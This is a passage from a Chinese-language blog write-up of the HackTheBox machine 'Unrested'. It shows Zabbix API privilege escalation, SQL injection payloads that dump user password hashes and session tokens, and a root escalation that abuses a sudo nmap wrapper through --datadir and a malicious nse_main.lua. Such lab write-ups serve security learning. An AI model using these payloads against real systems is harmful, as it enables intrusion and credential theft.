class="string">&quot;line&quot;</span>:99,<span class="string">&quot;function&quot;</span>:<span class="string">&quot;callMethod&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;CLocalApiClient&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;-&gt;&quot;</span>&#125;,&#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;/usr/share/zabbix/api_jsonrpc.php&quot;</span>,<span class="string">&quot;line&quot;</span>:58,<span class="string">&quot;function&quot;</span>:<span class="string">&quot;execute&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;CJsonRpc&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;-&gt;&quot;</span>&#125;]&#125;,<span class="string">&quot;id&quot;</span>:3&#125;&#123;</span><br><span class="line">  <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;result&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;usrgrpid&quot;</span>: <span class="string">&quot;11&quot;</span>,</span><br><span class="line">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Enabled debug mode&quot;</span>,</span><br><span class="line">      <span class="string">&quot;gui_access&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;users_status&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;debug_mode&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">      <span class="string">&quot;userdirectoryid&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mfa_status&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mfaid&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: 1</span><br><span class="line">&#125;</span><br><span class="line">&#123;<span class="string">&quot;jsonrpc&quot;</span>:<span class="string">&quot;2.0&quot;</span>,<span class="string">&quot;result&quot;</span>:&#123;<span class="string">&quot;userids&quot;</span>:[<span class="string">&quot;3&quot;</span>]&#125;,<span class="string">&quot;id&quot;</span>:3&#125;&#123;</span><br><span class="line">  <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;result&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;usrgrpid&quot;</span>: <span class="string">&quot;13&quot;</span>,</span><br><span class="line">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Internal&quot;</span>,</span><br><span class="line">      <span class="string">&quot;gui_access&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">      <span class="string">&quot;users_status&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;debug_mode&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;userdirectoryid&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mfa_status&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;mfaid&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到组<code>7</code>是超管组</p>
<p>替换为7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;:&quot;user.update&quot;, &quot;params&quot;:&#123;&quot;userid&quot;: &quot;3&quot;,&quot;usrgrps&quot;: [&#123;&quot;usrgrpid&quot;: 7&#125;] &#125;,</span><br><span class="line"></span><br><span class="line">&quot;auth&quot;: &quot;b4353b38f7f909df7cd34a37dceba239&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;id&quot;: 1</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在再一次尝试查询，把<code>editable</code>关掉，再查一波，成功回显组内信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --request POST \</span><br><span class="line">--url &#x27;http://10.10.11.50/zabbix/api_jsonrpc.php&#x27; \</span><br><span class="line">--header &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">--data &#x27;&#123;&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.get&quot;, &quot;params&quot;: &#123;&quot;selectRole&quot;: [&quot;u.roleid&quot;]&#125;, &quot;auth&quot;: &quot;3605b857a058de657f39ce31e753f497&quot;, &quot;id&quot;: 1&#125;&#x27; -s|jq </span><br><span class="line">&#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;result&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;userid&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;username&quot;: &quot;Admin&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;Zabbix&quot;,</span><br><span class="line">      &quot;surname&quot;: &quot;Administrator&quot;,</span><br><span class="line">      &quot;url&quot;: &quot;&quot;,</span><br><span class="line">      &quot;autologin&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;autologout&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;lang&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;refresh&quot;: &quot;30s&quot;,</span><br><span class="line">      &quot;theme&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;attempt_failed&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;attempt_ip&quot;: &quot;10.10.16.8&quot;,</span><br><span class="line">      &quot;attempt_clock&quot;: &quot;1734156350&quot;,</span><br><span class="line">      &quot;rows_per_page&quot;: &quot;50&quot;,</span><br><span class="line">      &quot;timezone&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;roleid&quot;: &quot;3&quot;,</span><br><span class="line">      &quot;userdirectoryid&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;ts_provisioned&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;role&quot;: []</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;userid&quot;: &quot;3&quot;,</span><br><span class="line">      &quot;username&quot;: &quot;matthew&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;matthewa&quot;,</span><br><span class="line">      &quot;surname&quot;: &quot;matthew&quot;,</span><br><span class="line">      &quot;url&quot;: &quot;&quot;,</span><br><span class="line">      &quot;autologin&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;autologout&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;lang&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;refresh&quot;: &quot;30s&quot;,</span><br><span class="line">      &quot;theme&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;attempt_failed&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;attempt_ip&quot;: &quot;&quot;,</span><br><span class="line">      &quot;attempt_clock&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;rows_per_page&quot;: &quot;50&quot;,</span><br><span class="line">      &quot;timezone&quot;: &quot;default&quot;,</span><br><span class="line">      &quot;roleid&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;userdirectoryid&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;ts_provisioned&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;role&quot;: []</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;id&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开始注入，这里首先跑一下表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-------------------------(select group_concat(table_name) from information_schema.tables where table_schema=database())&quot;: </span><br><span class="line"></span><br><span class="line">&quot;users,proxy_rtdata,lld_override_opdiscover,hgset,proxy_history</span><br><span class="line">,item_rtdata,httpstep,sessions,script_param,token,event_tag,proxy_group,item_discovery,problem,graphs,connector_tag,report_usrgrp,correlation,dashboard_page,service_alar</span><br><span class="line">ms,report_user,dashboard_user,maintenance_tag,dbversion,sysmap_user,user_ugset,maintenances_groups,graphs_items,host_rtdata,images,lld_override_opseverity,media_type,lld</span><br><span class="line">_macro_path,sysmaps,userdirectory_idpgroup,task_remote_command_result,sysmap_element_trigger,lld_override_optemplate,media,sysmaps_element_tag,conditions,opcommand_grp,u</span><br><span class="line">serdirectory_ldap,lld_override_opperiod,sysmap_usrgrp,sysmaps_link_triggers,item_preproc,report,service_tag,events,graph_discovery,lld_override_optrends,interface,opcomm</span><br><span class="line">and,problem_tag,host_discovery,proxy,sysmap_element_url,userdirectory,task_acknowledge,trends,event_symptom,ids,interface_discovery,userdirectory_usrgrp,lld_override_ops</span><br><span class="line">tatus,permission,media_type_param,rights,maintenances_hosts,items,service_problem,httptest,autoreg_host,opcommand_hst,lld_override_condition,role_rule,sysmaps_links,sysm</span><br><span class="line">ap_url,task,expressions,trigger_queue,history_str,group_discovery,user_scim_group,globalvars,valuemap_mapping,host_proxy,alerts,services,report_param,host_tag,sla_schedu</span><br><span class="line">le,media_type_message,role,housekeeper,host_hgset,widget,proxy_autoreg_host,lld_override,task_check_now,proxy_dhistory,opconditions,graph_theme,optemplate,config_autoreg</span><br><span class="line">_tls,task_result,scim_group,trigger_tag,sysmap_shape,functions,maintenances,drules,dservices,usrgrp,tag_filter,lld_override_opinventory,profiles,userdirectory_media,dhos</span><br><span class="line">ts,opgroup,users_groups,trends_uint,hgset_group,history_bin,corr_operation,history_text,triggers,regexps,host_inventory,item_rtname,sla_service_tag,opmessage,acknowledge</span><br><span class="line">s,ugset_group,httpstepitem,globalmacro,hosts_groups,scripts,httptest_field,lld_override_operation,ugset,dashboard_usrgrp,corr_condition_tagpair,item_parameter,hstgrp,tim</span><br><span class="line">eperiods,ha_node,sla,changelog,history_uint,lld_override_ophistory,history_log,httpstep_field,widget_field,task_close_problem,sla_excluded_downtime,event_suppress,hosts,item_tag,proxy_group_rtdata,connector,task_data,opmessage_grp,corr_condition,sysmaps_elements,group_prototype,dchecks,httptest_tag,auditlog,module,trigger_discovery,mfa_</span><br><span class="line">totp_secret,dashboard,httptestitem,userdirectory_saml,opinventory,service_problem_tag,corr_condition_tag,services_links,opmessage_usr,lld_override_optag,trigger_depends,</span><br><span class="line">history,hostmacro,icon_mapping,service_status_rule,mfa,config,icon_map,corr_condition_tagvalue,item_condition,event_recovery,hosts_templates,valuemap,corr_condition_grou</span><br><span class="line">p,optag,task_remote_command,maintenances_windows,escalations,actions,interface_snmp,operations&quot;</span><br></pre></td></tr></table></figure>

<p>user表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(select group_concat(concat_ws(&#x27;,&#x27;,userid,username,name,surname,passwd,url,autologin,autologout,lang,refresh,theme,attempt_failed,attempt_ip,attempt_clock,rows_per_page,timezone,roleid,userdirectoryid,ts_provisioned,&#x27;|&#x27;)) FROM zabbix.users)&quot;:&quot;</span><br><span class="line"></span><br><span class="line">1,Admin,Zabbix,Administrator,$2y$10$L8UqvYPqu6d7c8NeChnxWe1.w6ycyBERr8UgeUYh.3AO7ps3zer2a,,1,0,default,30s,default,0,10.10.16.8,1734156350,50,default,3,0,|,2,guest,,,$2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06,,0,15m,default,30s,default,0,,0,50,default,4,0,|,3,matthew,matthewa,matthew,$2y$10$e2IsM6YkVvyLX43W5CVhxeA46ChWOUNRzSdIyVzKhRTK00eGq4SwS,,1,0,default,30s,default,0,,0,50,default,1,0,|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1,Admin,Zabbix,Administrator,$2y$10$L8UqvYPqu6d7c8NeChnxWe1.w6ycyBERr8UgeUYh.3AO7ps3zer2a,,1,0,default,30s,default,0,10.10.16.8,1734156350,50,default,3,0</span><br><span class="line">2,guest,,,$2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06,,0,15m,default,30s,default,0,,0,50,default,4,0,</span><br><span class="line">3,matthew,matthewa,matthew,$2y$10$e2IsM6YkVvyLX43W5CVhxeA46ChWOUNRzSdIyVzKhRTK00eGq4SwS,,1,0,default,30s,default,0,,0,50,default,1,0</span><br></pre></td></tr></table></figure>

<p>sessions表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sessionid,userid,lastaccess,status,secret</span><br><span class="line"></span><br><span class="line">296e7dc9a5d20eac03bed07d9d63aea9,1,1734172812,0,91d00fed09ca47094fdc3f44af147af3</span><br><span class="line"></span><br><span class="line">56091871f4c393e0f2b35459b4b74c87,3,1734175583,0,c2da16fb6d4221f14d27dcdfc4f1d888</span><br></pre></td></tr></table></figure>

<p>这里3是我们当前账户，1对应的admin账户，拿到sessionid可以越权了</p>
<h2 id="to-Root"><a href="#to-Root" class="headerlink" title="to Root"></a>to Root</h2><p>这里进来之后<code>sudo -l</code>给了个<code>nmap</code></p>
<p>按照 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a> 尝试了下，好像都被ban了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">zabbix@unrested:~$ TF=$(mktemp)                                                                                    </span><br><span class="line">zabbix@unrested:~$ sudo nmap --script=$TF                                                                          </span><br><span class="line">Script mode is disabled for security reasons.                                                                      </span><br><span class="line">zabbix@unrested:~$ echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF                                                              </span><br><span class="line">zabbix@unrested:~$ sudo nmap --script=$TF                                                                          </span><br><span class="line">Script mode is disabled for security reasons.                                                                      </span><br><span class="line">zabbix@unrested:~$ sudo nmap --interactive                                                                         </span><br><span class="line">Interactive mode is disabled for security reasons.</span><br></pre></td></tr></table></figure>

<p>看了下调用的nmap文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">#################################</span><br><span class="line">## Restrictive nmap for Zabbix ##</span><br><span class="line">#################################</span><br><span class="line"></span><br><span class="line"># List of restricted options and corresponding error messages</span><br><span class="line">declare -A RESTRICTED_OPTIONS=(</span><br><span class="line">    [&quot;--interactive&quot;]=&quot;Interactive mode is disabled for security reasons.&quot;</span><br><span class="line">    [&quot;--script&quot;]=&quot;Script mode is disabled for security reasons.&quot;</span><br><span class="line">    [&quot;-oG&quot;]=&quot;Scan outputs in Greppable format are disabled for security reasons.&quot;</span><br><span class="line">    [&quot;-iL&quot;]=&quot;File input mode is disabled for security reasons.&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># Check if any restricted options are used</span><br><span class="line">for option in &quot;$&#123;!RESTRICTED_OPTIONS[@]&#125;&quot;; do</span><br><span class="line">    if [[ &quot;$*&quot; == *&quot;$option&quot;* ]]; then</span><br><span class="line">        echo &quot;$&#123;RESTRICTED_OPTIONS[$option]&#125;&quot;</span><br><span class="line">        exit 1</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"># Execute the original nmap binary with the provided arguments</span><br></pre></td></tr></table></figure>

<p>是有过滤的，但是可以通过<code>--datadir</code>来实现加载目录重定向，选一个看起来相对主要的文件名拿过来用一下。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://nmap.org/book/data-files-replacing-data-files.html">https://nmap.org/book/data-files-replacing-data-files.html</a></p>
</blockquote>
<p>这里</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/liun1994/p/7041373.html">https://www.cnblogs.com/liun1994/p/7041373.html</a></p>
<p>看起来<code>nse_main.lua</code>应该是作为后续扫描的主要逻辑入口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27;&gt; /tmp/nse_main.lua</span><br><span class="line"></span><br><span class="line">zabbix@unrested:/tmp$ sudo nmap --datadir /tmp/ -sV </span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-16 07:40 UTC</span><br><span class="line"># </span><br></pre></td></tr></table></figure>

<p>getroot</p>

        
      </div>
      
         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2024/12/17/box-wp-Heal/"
      title="【season-6】 htb Heal wp"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        【season-6】 htb Heal wp
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2024/12/12/Tracks-AD-Rebound/"
      title="Tracks-AD-Rebound"
     >

    <p class="title-text">
      
        Tracks-AD-Rebound
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>






    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Flower<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>


    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>


